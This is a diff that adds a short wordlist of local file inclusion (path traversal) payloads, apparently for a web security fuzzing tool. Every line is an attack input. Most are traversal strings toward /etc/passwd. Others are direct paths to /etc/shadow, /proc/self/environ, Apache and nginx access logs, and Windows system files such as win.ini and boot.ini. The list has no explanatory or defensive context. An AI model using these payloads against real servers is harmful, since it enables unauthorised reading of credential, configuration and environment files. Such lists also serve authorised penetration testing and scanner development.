@@ -1,0 +1,19 @@
+# LFI - Path Traversal Payloads
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/proc/self/environ
+/proc/self/cmdline
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/apache/access.log
+C:\Windows\win.ini
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+../../../windows/win.ini
